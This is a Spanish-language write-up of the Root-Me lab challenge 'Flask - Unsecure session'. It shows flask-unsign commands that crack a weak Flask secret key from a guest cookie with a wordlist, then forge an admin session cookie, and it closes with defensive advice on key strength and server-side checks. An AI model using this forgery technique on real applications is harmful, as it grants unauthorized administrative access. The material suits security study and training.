# Web - Server — Flask - Unsecure session

## Descripción

> **Enunciado oficial:** “Flask-me’s web developer tells you that using a strong secret key is useless. Prove him wrong !”

- **Categoría:** Web - Server
- **Puntos:** 20
- **Reto:** [Root-Me — Flask - Unsecure session](https://www.root-me.org/en/Challenges/Web-Server/Flask-Unsecure-session)

La cookie `session` de Flask contiene los atributos de usuario y administrador firmados. Una clave secreta débil permite descubrir la firma y generar una sesión válida con privilegios administrativos.

## Solución

1. Obtener la cookie `session` de invitado y comprobar que es una sesión firmada de Flask.
2. Verificar la fortaleza de la clave en la instancia aislada con una lista autorizada:

   ```bash
   flask-unsign --unsign --no-literal-eval \
     --cookie '<cookie-de-invitado>' --wordlist wordlist.txt
   ```

3. Firmar una cookie con los atributos administrativos usando únicamente la clave encontrada:

   ```bash
   flask-unsign --sign \
     --cookie "{'admin':'true','username':'admin'}" --secret '<clave>'
   ```

4. Enviar la cookie al panel de administración y usar el dato devuelto solo para validar en Root-Me.

La respuesta fue validada y el «Like» quedó registrado.

## Notas adicionales

- La firma protege la integridad de una sesión solo si la clave tiene suficiente entropía y permanece secreta.
- Los privilegios deben validarse en servidor y las claves deben generarse aleatoriamente, rotarse y mantenerse fuera del código.
- La respuesta y la clave no se versionan.

## Referencias

- [Reto oficial](https://www.root-me.org/en/Challenges/Web-Server/Flask-Unsecure-session)
- [Flask — Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
